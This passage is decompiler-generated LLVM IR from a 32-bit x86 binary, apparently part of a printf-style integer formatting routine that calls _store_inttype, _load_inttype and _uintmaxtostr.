dec_label_pc_8050e99:                             ; preds = %dec_label_pc_8050e5b, %dec_label_pc_8050e92
  %v0_8050ea127 = phi i32 [ %v1_8050e8c, %dec_label_pc_8050e5b ], [ %v3_8050e95, %dec_label_pc_8050e92 ]
  %v1_8050e99 = add i32 %v0_8050e7f, 60
  %v2_8050e99 = inttoptr i32 %v1_8050e99 to i32*
  %v3_8050e99 = load i32, i32* %v2_8050e99, align 4
  store i32 %v3_8050e99, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8050eac72 = sub i32 0, %v3_8050e99
  %v10_8050eac75 = and i32 %v3_8050e99, %v2_8050eac72
  %v11_8050eac76 = icmp slt i32 %v10_8050eac75, 0
  %v13_8050eac77 = icmp slt i32 %v2_8050eac72, 0
  %v2_8050eae78 = icmp eq i1 %v13_8050eac77, %v11_8050eac76
  br i1 %v2_8050eae78, label %dec_label_pc_8050eb0, label %dec_label_pc_8050ea1

dec_label_pc_8050ea1:                             ; preds = %dec_label_pc_8050e99, %dec_label_pc_8050ea1
  %v0_8050eb082 = phi i32 [ %v0_8050eb0, %dec_label_pc_8050ea1 ], [ %v1_8050e84, %dec_label_pc_8050e99 ]
  %v2_8050ea181 = phi i32 [ %v1_8050eab, %dec_label_pc_8050ea1 ], [ 0, %dec_label_pc_8050e99 ]
  %v0_8050ea180 = phi i32 [ %v1_8050ea8, %dec_label_pc_8050ea1 ], [ %v0_8050ea127, %dec_label_pc_8050e99 ]
  %v3_8050ea1 = mul i32 %v2_8050ea181, 4
  %v4_8050ea1 = add i32 %v3_8050ea1, 344
  %v5_8050ea1 = add i32 %v4_8050ea1, %v0_8050eb082
  %v6_8050ea1 = inttoptr i32 %v5_8050ea1 to i32*
  store i32 %v0_8050ea180, i32* %v6_8050ea1, align 4
  %v0_8050ea8 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050ea8 = add i32 %v0_8050ea8, 12
  store i32 %v1_8050ea8, i32* %edx.global-to-local, align 4
  %v0_8050eab = load i32, i32* %eax.global-to-local, align 4
  %v1_8050eab = add i32 %v0_8050eab, 1
  %v1_8050eac.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050eab, i32* %eax.global-to-local, align 4
  %v2_8050eac = sub i32 %v1_8050eab, %v1_8050eac.pre
  %v8_8050eac = xor i32 %v1_8050eab, %v1_8050eac.pre
  %v9_8050eac = xor i32 %v2_8050eac, %v1_8050eab
  %v10_8050eac = and i32 %v9_8050eac, %v8_8050eac
  %v11_8050eac = icmp slt i32 %v10_8050eac, 0
  %v13_8050eac = icmp slt i32 %v2_8050eac, 0
  %v2_8050eae = icmp eq i1 %v13_8050eac, %v11_8050eac
  %v0_8050eb0 = load i32, i32* @esp, align 4
  br i1 %v2_8050eae, label %dec_label_pc_8050eb0, label %dec_label_pc_8050ea1

dec_label_pc_8050eb0:                             ; preds = %dec_label_pc_8050ea1, %dec_label_pc_8050e99
  %v0_8050eb0.lcssa = phi i32 [ %v1_8050e84, %dec_label_pc_8050e99 ], [ %v0_8050eb0, %dec_label_pc_8050ea1 ]
  %v1_8050eb0 = add i32 %v0_8050eb0.lcssa, 48
  %v2_8050eb0 = inttoptr i32 %v1_8050eb0 to i32*
  %v3_8050eb0 = load i32, i32* %v2_8050eb0, align 4
  store i32 %v3_8050eb0, i32* @ecx, align 4
  %v1_8050eb4 = icmp eq i32 %v3_8050eb0, 0
  %v2_8050eb4 = icmp slt i32 %v3_8050eb0, 0
  store i1 %v2_8050eb4, i1* %sf.global-to-local, align 1
  %v1_8050eb6 = icmp eq i1 %v1_8050eb4, false
  br i1 %v1_8050eb6, label %dec_label_pc_8050ede, label %dec_label_pc_8050eb8

dec_label_pc_8050eb8:                             ; preds = %dec_label_pc_8050eb0
  %v1_8050eb8 = inttoptr i32 %v0_8050eb0.lcssa to i32*
  %v2_8050eb8 = load i32, i32* %v1_8050eb8, align 4
  store i32 %v2_8050eb8, i32* %eax.global-to-local, align 4
  %v1_8050ebb = ashr i32 %v2_8050eb8, 31
  store i32 %v1_8050ebb, i32* %edx.global-to-local, align 4
  %v2_8050ebc = add i32 %v0_8050eb0.lcssa, -4
  %v3_8050ebc = inttoptr i32 %v2_8050ebc to i32*
  store i32 %v1_8050ebb, i32* %v3_8050ebc, align 4
  %v0_8050ebd = load i32, i32* %eax.global-to-local, align 4
  %v2_8050ebd = add i32 %v0_8050eb0.lcssa, -8
  %v3_8050ebd = inttoptr i32 %v2_8050ebd to i32*
  store i32 %v0_8050ebd, i32* %v3_8050ebd, align 4
  %v1_8050ebe = add i32 %v0_8050eb0.lcssa, 32
  %v2_8050ebe = inttoptr i32 %v1_8050ebe to i32*
  %v3_8050ebe = load i32, i32* %v2_8050ebe, align 4
  %v1_8050ec2 = and i32 %v3_8050ebe, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_8050ec2, i32* %eax.global-to-local, align 4
  %v2_8050ec7 = add i32 %v0_8050eb0.lcssa, -12
  %v3_8050ec7 = inttoptr i32 %v2_8050ec7 to i32*
  store i32 %v1_8050ec2, i32* %v3_8050ec7, align 4
  %v1_8050ec8 = add i32 %v0_8050eb0.lcssa, 344
  %v2_8050ec8 = inttoptr i32 %v1_8050ec8 to i32*
  %v3_8050ec8 = load i32, i32* %v2_8050ec8, align 4
  store i32 %v3_8050ec8, i32* %eax.global-to-local, align 4
  %v1_8050ecf = inttoptr i32 %v3_8050ec8 to i32*
  %v2_8050ecf = load i32, i32* %v1_8050ecf, align 4
  %v4_8050ecf = add i32 %v0_8050eb0.lcssa, -16
  %v5_8050ecf = inttoptr i32 %v4_8050ecf to i32*
  store i32 %v2_8050ecf, i32* %v5_8050ecf, align 4
  %v0_8050ed1 = call i32 @_store_inttype()
  store i32 %v0_8050ed1, i32* %eax.global-to-local, align 4
  %v0_8050ed6 = load i32, i32* @esp, align 4
  %v1_8050ed6 = add i32 %v0_8050ed6, 16
  %v7_8050ed6 = icmp slt i32 %v1_8050ed6, 0
  store i1 %v7_8050ed6, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8051320

dec_label_pc_8050ede:                             ; preds = %dec_label_pc_8050eb0
  %v1_8050ede = add i32 %v3_8050eb0, -7
  %v5_8050ede = icmp ult i32 %v3_8050eb0, 7
  %v9_8050ede = icmp eq i32 %v1_8050ede, 0
  %v10_8050ede = icmp slt i32 %v1_8050ede, 0
  store i1 %v10_8050ede, i1* %sf.global-to-local, align 1
  %v2_8050ee1 = or i1 %v5_8050ede, %v9_8050ede
  br i1 %v2_8050ee1, label %dec_label_pc_8050ee7, label %dec_label_pc_805104b

dec_label_pc_8050ee7:                             ; preds = %dec_label_pc_8050ede
  %v1_8050ee7 = add i32 %v3_8050eb0, 134592732
  %v2_8050ee7 = inttoptr i32 %v1_8050ee7 to i8*
  %v3_8050ee7 = load i8, i8* %v2_8050ee7, align 1
  %v4_8050ee7 = sext i8 %v3_8050ee7 to i32
  store i32 %v4_8050ee7, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_8050ef3 = icmp eq i8 %v3_8050ee7, 10
  %v10_8050ef3 = icmp slt i8 %v3_8050ee7, 10
  store i1 %v10_8050ef3, i1* %sf.global-to-local, align 1
  %v1_8050ef6 = icmp eq i1 %v9_8050ef3, false
  br i1 %v1_8050ef6, label %dec_label_pc_8050f16, label %dec_label_pc_8050ef8

dec_label_pc_8050ef8:                             ; preds = %dec_label_pc_8050ee7
  %v1_8050ef8 = add i32 %v0_8050eb0.lcssa, 32
  %v2_8050ef8 = inttoptr i32 %v1_8050ef8 to i32*
  %v3_8050ef8 = load i32, i32* %v2_8050ef8, align 4
  store i32 %v3_8050ef8, i32* %eax.global-to-local, align 4
  %v1_8050efe = udiv i32 %v3_8050ef8, 32
  %tmp67 = urem i32 %v1_8050efe, 2
  %tmp68 = sub nsw i32 45, %tmp67
  %v2_8050f0e = or i32 %tmp68, 128
  store i32 %v2_8050f0e, i32* %edx.global-to-local, align 4
  %v2_8050f11 = and i32 %v3_8050ef8, 64
  %v3_8050f11 = icmp eq i32 %v2_8050f11, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_8050f13 = icmp eq i1 %v3_8050f11, false
  %v4_8050f13 = select i1 %v1_8050f13, i32 %v2_8050f0e, i32 %tmp68
  store i32 %v4_8050f13, i32* @ebx, align 4
  br label %dec_label_pc_8050f16

dec_label_pc_8050f16:                             ; preds = %dec_label_pc_8050ee7, %dec_label_pc_8050ef8
  %v1_8050f16 = add i32 %v3_8050eb0, -5
  %v5_8050f16 = icmp ult i32 %v3_8050eb0, 5
  %v9_8050f16 = icmp eq i32 %v1_8050f16, 0
  %v10_8050f16 = icmp slt i32 %v1_8050f16, 0
  store i1 %v10_8050f16, i1* %sf.global-to-local, align 1
  %v2_8050f19 = or i1 %v5_8050f16, %v9_8050f16
  br i1 %v2_8050f19, label %dec_label_pc_8050f1b, label %dec_label_pc_8050f33

dec_label_pc_8050f1b:                             ; preds = %dec_label_pc_8050f16
  %v1_8050f1b = add i32 %v3_8050eb0, -3
  %v9_8050f1b = icmp eq i32 %v1_8050f1b, 0
  %v10_8050f1b = icmp slt i32 %v1_8050f1b, 0
  store i1 %v10_8050f1b, i1* %sf.global-to-local, align 1
  %v1_8050f1e = icmp eq i1 %v9_8050f1b, false
  br i1 %v1_8050f1e, label %dec_label_pc_8050f27, label %dec_label_pc_8050f20

dec_label_pc_8050f20:                             ; preds = %dec_label_pc_8050f1b
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_8050f35

dec_label_pc_8050f27:                             ; preds = %dec_label_pc_8050f1b
  %v1_8050f27 = add i32 %v3_8050eb0, -1
  %v9_8050f27 = icmp eq i32 %v1_8050f27, 0
  %v10_8050f27 = icmp slt i32 %v1_8050f27, 0
  store i1 %v10_8050f27, i1* %sf.global-to-local, align 1
  br i1 %v9_8050f27, label %dec_label_pc_8050f3a, label %dec_label_pc_8050f35

dec_label_pc_8050f33:                             ; preds = %dec_label_pc_8050f16
  %v1_8050f33 = sub nsw i32 0, %v4_8050ee7
  %v7_8050f33 = icmp sgt i8 %v3_8050ee7, 0
  store i1 %v7_8050f33, i1* %sf.global-to-local, align 1
  store i32 %v1_8050f33, i32* @esi, align 4
  br label %dec_label_pc_8050f35

dec_label_pc_8050f35:                             ; preds = %dec_label_pc_8050f27, %dec_label_pc_8050f20, %dec_label_pc_8050f33
  br label %dec_label_pc_8050f3a

dec_label_pc_8050f3a:                             ; preds = %dec_label_pc_8050f27, %dec_label_pc_8050f35
  %storemerge = phi i32 [ 11, %dec_label_pc_8050f35 ], [ 6, %dec_label_pc_8050f27 ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_8050f3a = add i32 %v0_8050eb0.lcssa, 20
  %v2_8050f3a = inttoptr i32 %v1_8050f3a to i32*
  %v3_8050f3a = load i32, i32* %v2_8050f3a, align 4
  %v5_8050f3a = icmp slt i32 %v3_8050f3a, 0
  store i1 %v5_8050f3a, i1* %sf.global-to-local, align 1
  %v1_8050f3f = add i32 %v0_8050eb0.lcssa, 7
  %v2_8050f3f = inttoptr i32 %v1_8050f3f to i8*
  store i8 32, i8* %v2_8050f3f, align 1
  %v0_8050f44 = load i1, i1* %sf.global-to-local, align 1
  %v1_8050f44 = icmp eq i1 %v0_8050f44, false
  br i1 %v1_8050f44, label %dec_label_pc_8050f4e, label %dec_label_pc_8050f46

dec_label_pc_8050f46:                             ; preds = %dec_label_pc_8050f3a
  %v0_8050f46 = load i32, i32* @esp, align 4
  %v1_8050f46 = add i32 %v0_8050f46, 36
  %v2_8050f46 = inttoptr i32 %v1_8050f46 to i8*
  %v3_8050f46 = load i8, i8* %v2_8050f46, align 1
  %v4_8050f46 = zext i8 %v3_8050f46 to i32
  %v5_8050f46 = load i32, i32* %edx.global-to-local, align 4
  %v6_8050f46 = and i32 %v5_8050f46, -256
  %v7_8050f46 = or i32 %v6_8050f46, %v4_8050f46
  store i32 %v7_8050f46, i32* %edx.global-to-local, align 4
  %v3_8050f4a = add i32 %v0_8050f46, 7
  %v4_8050f4a = inttoptr i32 %v3_8050f4a to i8*
  store i8 %v3_8050f46, i8* %v4_8050f4a, align 1
  br label %dec_label_pc_8050f4e

dec_label_pc_8050f4e:                             ; preds = %dec_label_pc_8050f3a, %dec_label_pc_8050f46
  %v1_8050f4e = add i32 %v3_8050eb0, -1
  %v8_8050f4e = icmp eq i32 %v1_8050f4e, 0
  %v9_8050f4e = icmp slt i32 %v1_8050f4e, 0
  store i1 %v9_8050f4e, i1* %sf.global-to-local, align 1
  store i32 %v1_8050f4e, i32* %ecx.global-to-local, align 4
  %v0_8050f4f = load i32, i32* @esp, align 4
  %v1_8050f4f = add i32 %v0_8050f4f, 344
  %v2_8050f4f = inttoptr i32 %v1_8050f4f to i32*
  %v3_8050f4f = load i32, i32* %v2_8050f4f, align 4
  store i32 %v3_8050f4f, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_8050f67.pre = load i32, i32* @edi, align 4
  br i1 %v8_8050f4e, label %dec_label_pc_8050f67, label %dec_label_pc_8050f5d

dec_label_pc_8050f5d:                             ; preds = %dec_label_pc_8050f4e
  %v2_8050f5d = mul i32 %v0_8050f67.pre, 4
  %v3_8050f5d = add i32 %v0_8050f4f, 52
  %v4_8050f5d = add i32 %v3_8050f5d, %v2_8050f5d
  %v5_8050f5d = inttoptr i32 %v4_8050f5d to i32*
  %v6_8050f5d = load i32, i32* %v5_8050f5d, align 4
  %v1_8050f61 = and i32 %v6_8050f5d, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_8050f61, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050f67

dec_label_pc_8050f67:                             ; preds = %dec_label_pc_8050f4e, %dec_label_pc_8050f5d
  %v2_8050f67 = add i32 %v0_8050f4f, -4
  %v3_8050f67 = inttoptr i32 %v2_8050f67 to i32*
  store i32 %v0_8050f67.pre, i32* %v3_8050f67, align 4
  %v0_8050f68 = load i32, i32* @esi, align 4
  %v2_8050f68 = add i32 %v0_8050f4f, -8
  %v3_8050f68 = inttoptr i32 %v2_8050f68 to i32*
  store i32 %v0_8050f68, i32* %v3_8050f68, align 4
  %v0_8050f69 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050f69 = add i32 %v0_8050f4f, -12
  %v3_8050f69 = inttoptr i32 %v2_8050f69 to i32*
  store i32 %v0_8050f69, i32* %v3_8050f69, align 4
  %v0_8050f6a = load i32, i32* %edx.global-to-local, align 4
  %v2_8050f6a = add i32 %v0_8050f4f, -16
  %v3_8050f6a = inttoptr i32 %v2_8050f6a to i32*
  store i32 %v0_8050f6a, i32* %v3_8050f6a, align 4
  %v0_8050f6b = call i32 @_load_inttype()
  %v0_8050f70 = load i32, i32* @ebx, align 4
  %v1_8050f70 = load i32, i32* @esp, align 4
  %v2_8050f70 = inttoptr i32 %v1_8050f70 to i32*
  store i32 %v0_8050f70, i32* %v2_8050f70, align 4
  %v0_8050f73 = load i32, i32* @esi, align 4
  %v1_8050f73 = load i32, i32* @esp, align 4
  %v2_8050f73 = add i32 %v1_8050f73, -4
  %v3_8050f73 = inttoptr i32 %v2_8050f73 to i32*
  store i32 %v0_8050f73, i32* %v3_8050f73, align 4
  %v0_8050f74 = load i32, i32* @edx, align 4
  %v2_8050f74 = add i32 %v1_8050f73, -8
  %v3_8050f74 = inttoptr i32 %v2_8050f74 to i32*
  store i32 %v0_8050f74, i32* %v3_8050f74, align 4
  %v2_8050f75 = add i32 %v1_8050f73, -12
  %v3_8050f75 = inttoptr i32 %v2_8050f75 to i32*
  store i32 %v0_8050f6b, i32* %v3_8050f75, align 4
  %v1_8050f76 = add i32 %v1_8050f73, 347
  store i32 %v1_8050f76, i32* %eax.global-to-local, align 4
  %v2_8050f7d = add i32 %v1_8050f73, -16
  %v3_8050f7d = inttoptr i32 %v2_8050f7d to i32*
  store i32 %v1_8050f76, i32* %v3_8050f7d, align 4
  %v0_8050f7e = load i32, i32* %stack_var_-364, align 4
  %v5_8050f7e = inttoptr i32 %v0_8050f7e to i8*
  %v6_8050f7e = call i32 @_uintmaxtostr(i8* %v5_8050f7e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8050f7e, i32* %eax.global-to-local, align 4
  %v0_8050f83 = load i32, i32* @esp, align 4
  %v1_8050f83 = add i32 %v0_8050f83, 32
  %v1_8050f86 = add i32 %v0_8050f83, 80
  %v2_8050f86 = inttoptr i32 %v1_8050f86 to i32*
  %v3_8050f86 = load i32, i32* %v2_8050f86, align 4
  %v4_8050f86 = add i32 %v3_8050f86, -5
  %v8_8050f86 = icmp ult i32 %v3_8050f86, 5
  %v12_8050f86 = icmp eq i32 %v4_8050f86, 0
  %v13_8050f86 = icmp slt i32 %v4_8050f86, 0
  store i1 %v13_8050f86, i1* %sf.global-to-local, align 1
  store i32 %v6_8050f7e, i32* @edi, align 4
  %v2_8050f8d = or i1 %v8_8050f86, %v12_8050f86
  br i1 %v2_8050f8d, label %dec_label_pc_8050fb7, label %dec_label_pc_8050f8f

dec_label_pc_8050f8f:                             ; preds = %dec_label_pc_8050f67
  %v7_8050f7e = inttoptr i32 %v6_8050f7e to i8*
  %v3_8050f8f = load i8, i8* %v7_8050f7e, align 1
  %v4_8050f8f = add i8 %v3_8050f8f, -45
  %v12_8050f8f = icmp eq i8 %v4_8050f8f, 0
  %v13_8050f8f = icmp slt i8 %v4_8050f8f, 0
  store i1 %v13_8050f8f, i1* %sf.global-to-local, align 1
  %v1_8050f92 = icmp eq i1 %v12_8050f8f, false
  %v1_8050fa1 = add i32 %v0_8050f83, 64
  %v2_8050fa1 = inttoptr i32 %v1_8050fa1 to i32*
  %v3_8050fa1 = load i32, i32* %v2_8050fa1, align 4
  br i1 %v1_8050f92, label %dec_label_pc_8050fa1, label %dec_label_pc_8050f94

dec_label_pc_8050f94:                             ; preds = %dec_label_pc_8050f8f
  %v4_8050f94 = or i32 %v3_8050fa1, 2
  store i32 %v4_8050f94, i32* %v2_8050fa1, align 4
  %v0_8050f99 = load i32, i32* @edi, align 4
  %v1_8050f99 = add i32 %v0_8050f99, 1
  %v9_8050f99 = icmp slt i32 %v1_8050f99, 0
  store i1 %v9_8050f99, i1* %sf.global-to-local, align 1
  store i32 %v1_8050f99, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_8050fb7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050fb7

dec_label_pc_8050fa1:                             ; preds = %dec_label_pc_8050f8f
  store i32 %v3_8050fa1, i32* %eax.global-to-local, align 4
  %v2_8050fa5 = and i32 %v3_8050fa1, 2
  %v3_8050fa5 = icmp eq i32 %v2_8050fa5, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_8050fa5, label %dec_label_pc_8050fad, label %dec_label_pc_8050fa9

dec_label_pc_8050fa9:                             ; preds = %dec_label_pc_8050fa1
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8050fb7

dec_label_pc_8050fad:                             ; preds = %dec_label_pc_8050fa1
  %v2_8050fad = urem i32 %v3_8050fa1, 2
  %v3_8050fad = icmp eq i32 %v2_8050fad, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_8050fb4 = icmp eq i1 %v3_8050fad, false
  %v2_8050fb4 = load i32, i32* @ebp, align 4
  %v4_8050fb4 = select i1 %v1_8050fb4, i32 4, i32 %v2_8050fb4
  store i32 %v4_8050fb4, i32* @ebp, align 4
  br label %dec_label_pc_8050fb7

dec_label_pc_8050fb7:                             ; preds = %dec_label_pc_8050f67, %dec_label_pc_8050fa9, %dec_label_pc_8050f94, %dec_label_pc_8050fad
  %v0_8051009 = phi i32 [ %v6_8050f7e, %dec_label_pc_8050f67 ], [ %v6_8050f7e, %dec_label_pc_8050fa9 ], [ %v1_8050f99, %dec_label_pc_8050f94 ], [ %v6_8050f7e, %dec_label_pc_8050fad ]
  %v0_8051019 = phi i32 [ %v1_8050f83, %dec_label_pc_8050f67 ], [ %v1_8050f83, %dec_label_pc_8050fa9 ], [ %v0_8050fb7.pre, %dec_label_pc_8050f94 ], [ %v1_8050f83, %dec_label_pc_8050fad ]
  %v1_8050fb7 = add i32 %v0_8051019, 20
  %v2_8050fb7 = inttoptr i32 %v1_8050fb7 to i32*
  %v3_8050fb7 = load i32, i32* %v2_8050fb7, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_8050fbb = sub i32 204, %v0_8051009
  %v2_8050fc7 = add i32 %v1_8050fbb, %v0_8051019
  %v1_8050fc9 = add i32 %v2_8050fc7, 127
  store i32 %v1_8050fc9, i32* @esi, align 4
  %v2_8050fcc = icmp slt i32 %v3_8050fb7, 0
  store i1 %v2_8050fcc, i1* %sf.global-to-local, align 1
  %v3_8050fce = select i1 %v2_8050fcc, i32 1, i32 %v3_8050fb7
  store i32 %v3_8050fce, i32* %ecx.global-to-local, align 4
  %v1_8050fd1 = add i32 %v0_8051019, 32
  %v2_8050fd1 = inttoptr i32 %v1_8050fd1 to i8*
  %v3_8050fd1 = load i8, i8* %v2_8050fd1, align 1
  %v4_8050fd1 = and i8 %v3_8050fd1, 16
  %v5_8050fd1 = icmp eq i8 %v4_8050fd1, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_8050fd1, label %dec_label_pc_8051009, label %dec_label_pc_8050fd8

dec_label_pc_8050fd8:                             ; preds = %dec_label_pc_8050fb7
  %v1_8050fd8 = add i32 %v0_8051019, 48
  %v2_8050fd8 = inttoptr i32 %v1_8050fd8 to i32*
  %v3_8050fd8 = load i32, i32* %v2_8050fd8, align 4
  store i32 %v3_8050fd8, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i32 %v3_8050fd8, 3
  %v3_8050fe1 = load i32, i32* @ebp, align 4
  %v5_8050fe1 = select i1 %tmp69, i32 6, i32 %v3_8050fe1
  store i32 %v5_8050fe1, i32* @ebp, align 4
  %v1_8050fe4 = add i32 %v3_8050fd8, -3
  %v9_8050fe4 = icmp eq i32 %v1_8050fe4, 0
  %v10_8050fe4 = icmp slt i32 %v1_8050fe4, 0
  store i1 %v10_8050fe4, i1* %sf.global-to-local, align 1
  %v1_8050fe7 = icmp eq i1 %v9_8050fe4, false
  br i1 %v1_8050fe7, label %dec_label_pc_8050ff0, label %dec_label_pc_8050fe9

dec_label_pc_8050fe9:                             ; preds = %dec_label_pc_8050fd8
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_8051009

dec_label_pc_8050ff0:                             ; preds = %dec_label_pc_8050fd8
  %v1_8050ff0 = add i32 %v3_8050fd8, -4
  %v9_8050ff0 = icmp eq i32 %v1_8050ff0, 0
  %v10_8050ff0 = icmp slt i32 %v1_8050ff0, 0
  store i1 %v10_8050ff0, i1* %sf.global-to-local, align 1
  %v1_8050ff3 = icmp eq i1 %v9_8050ff0, false
  br i1 %v1_8050ff3, label %dec_label_pc_8051009, label %dec_label_pc_8050ff5

dec_label_pc_8050ff5:                             ; preds = %dec_label_pc_8050ff0
  %v2_8050ff5 = sub i32 %v3_8050fce, %v1_8050fc9
  %v7_8050ff5 = icmp ult i32 %v3_8050fce, %v1_8050fc9
  %v12_8050ff5 = icmp eq i32 %v2_8050ff5, 0
  %v13_8050ff5 = icmp slt i32 %v2_8050ff5, 0
  store i1 %v13_8050ff5, i1* %sf.global-to-local, align 1
  %v2_8050ff7 = or i1 %v7_8050ff5, %v12_8050ff5
  br i1 %v2_8050ff7, label %dec_label_pc_8050ff9, label %dec_label_pc_8051009

dec_label_pc_8050ff9:                             ; preds = %dec_label_pc_8050ff5
  %v1_8050ff9 = inttoptr i32 %v0_8051009 to i8*
  %v2_8050ff9 = load i8, i8* %v1_8050ff9, align 1
  %v3_8050ff9 = add i8 %v2_8050ff9, -48
  %v8_8050ff9 = icmp eq i8 %v3_8050ff9, 0
  %v9_8050ff9 = icmp slt i8 %v3_8050ff9, 0
  store i1 %v9_8050ff9, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_8050ff9, label %dec_label_pc_8051009, label %dec_label_pc_8051003

dec_label_pc_8051003:                             ; preds = %dec_label_pc_8050ff9
  %v1_8051003 = add i32 %v2_8050fc7, 128
  store i32 %v1_8051003, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051009

dec_label_pc_8051009:                             ; preds = %dec_label_pc_8050ff5, %dec_label_pc_8050ff9, %dec_label_pc_8050ff0, %dec_label_pc_8050fb7, %dec_label_pc_8050fe9, %dec_label_pc_8051003
  %v0_8051042 = phi i32 [ %v3_8050fce, %dec_label_pc_8050ff5 ], [ 1, %dec_label_pc_8050ff9 ], [ %v3_8050fce, %dec_label_pc_8050ff0 ], [ %v3_8050fce, %dec_label_pc_8050fb7 ], [ %v3_8050fce, %dec_label_pc_8050fe9 ], [ %v1_8051003, %dec_label_pc_8051003 ]
  %v1_8051009 = inttoptr i32 %v0_8051009 to i8*
  %v2_8051009 = load i8, i8* %v1_8051009, align 1
  %v3_8051009 = add i8 %v2_8051009, -48
  %v8_8051009 = icmp eq i8 %v3_8051009, 0
  %v9_8051009 = icmp slt i8 %v3_8051009, 0
  store i1 %v9_8051009, i1* %sf.global-to-local, align 1
  %v1_805100c = icmp eq i1 %v8_8051009, false
  br i1 %v1_805100c, label %dec_label_pc_805103a, label %dec_label_pc_805100e

dec_label_pc_805100e:                             ; preds = %dec_label_pc_8051009
  %v0_805100e = load i32, i32* @ebp, align 4
  %v1_805100e = add i32 %v0_805100e, -6
  %v6_805100e = sub i32 5, %v0_805100e
  %v7_805100e = and i32 %v6_805100e, %v0_805100e
  %v8_805100e = icmp slt i32 %v7_805100e, 0
  %v10_805100e = icmp slt i32 %v1_805100e, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_8051016 = icmp eq i1 %v10_805100e, %v8_805100e
  %v5_8051016 = select i1 %v2_8051016, i32 11, i32 %v0_805100e
  store i32 %v5_8051016, i32* @ebp, align 4
  %v1_8051019 = add i32 %v0_8051019, 48
  %v2_8051019 = inttoptr i32 %v1_8051019 to i32*
  %v3_8051019 = load i32, i32* %v2_8051019, align 4
  %v4_8051019 = add i32 %v3_8051019, -1
  %v12_8051019 = icmp eq i32 %v4_8051019, 0
  %v13_8051019 = icmp slt i32 %v4_8051019, 0
  store i1 %v13_8051019, i1* %sf.global-to-local, align 1
  %v1_805101e = icmp eq i1 %v12_8051019, false
  br i1 %v1_805101e, label %dec_label_pc_805102f, label %dec_label_pc_8051020

dec_label_pc_8051020:                             ; preds = %dec_label_pc_805100e
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_805b8c4.213 to i32), i32* @edi, align 4
  br label %dec_label_pc_80511b9

dec_label_pc_805102f:                             ; preds = %dec_label_pc_805100e
  %v1_805102f = icmp eq i32 %v0_8051042, 0
  %v2_805102f = icmp slt i32 %v0_8051042, 0
  store i1 %v2_805102f, i1* %sf.global-to-local, align 1
  %v1_8051031 = icmp eq i1 %v1_805102f, false
  br i1 %v1_8051031, label %dec_label_pc_805103a, label %dec_label_pc_8051033

dec_label_pc_8051033:                             ; preds = %dec_label_pc_805102f
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80511b9

dec_label_pc_805103a:                             ; preds = %dec_label_pc_805102f, %dec_label_pc_8051009
  %v2_805103a = sub i32 %v0_8051042, %v1_8050fc9
  %v7_805103a = icmp ult i32 %v0_8051042, %v1_8050fc9
  %v12_805103a = icmp eq i32 %v2_805103a, 0
  %v13_805103a = icmp slt i32 %v2_805103a, 0
  store i1 %v13_805103a, i1* %sf.global-to-local, align 1
  %v2_805103c = or i1 %v7_805103a, %v12_805103a
  br i1 %v2_805103c, label %dec_label_pc_80511b9, label %dec_label_pc_8051042

dec_label_pc_8051042:                             ; preds = %dec_label_pc_805103a
  store i1 %v13_805103a, i1* %sf.global-to-local, align 1
  store i32 %v2_805103a, i32* @ebx, align 4
  br label %dec_label_pc_80511d3

dec_label_pc_805104b:                             ; preds = %dec_label_pc_8050ede
  %v1_805104b = add i32 %v3_8050eb0, -15
  %v5_805104b = icmp ult i32 %v3_8050eb0, 15
  %v9_805104b = icmp eq i32 %v1_805104b, 0
  %v10_805104b = icmp slt i32 %v1_805104b, 0
  store i1 %v10_805104b, i1* %sf.global-to-local, align 1
  %v2_805104e = or i1 %v5_805104b, %v9_805104b
  br i1 %v2_805104e, label %dec_label_pc_8051050, label %dec_label_pc_8051095

dec_label_pc_8051050:                             ; preds = %dec_label_pc_805104b
  %v1_8051050 = add i32 %v0_8050eb0.lcssa, 33
  %v2_8051050 = inttoptr i32 %v1_8051050 to i8*
  %v3_8051050 = load i8, i8* %v2_8051050, align 1
  %v4_8051050 = and i8 %v3_8051050, 8
  %v5_8051050 = icmp eq i8 %v4_8051050, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_8051055 = add i32 %v0_8050eb0.lcssa, 344
  %v2_8051055 = inttoptr i32 %v1_8051055 to i32*
  %v3_8051055 = load i32, i32* %v2_8051055, align 4
  store i32 %v3_8051055, i32* %edx.global-to-local, align 4
  br i1 %v5_8051050, label %dec_label_pc_8051062, label %dec_label_pc_805105e

dec_label_pc_805105e:                             ; preds = %dec_label_pc_8051050
  %v1_805105e = inttoptr i32 %v3_8051055 to x86_fp80*
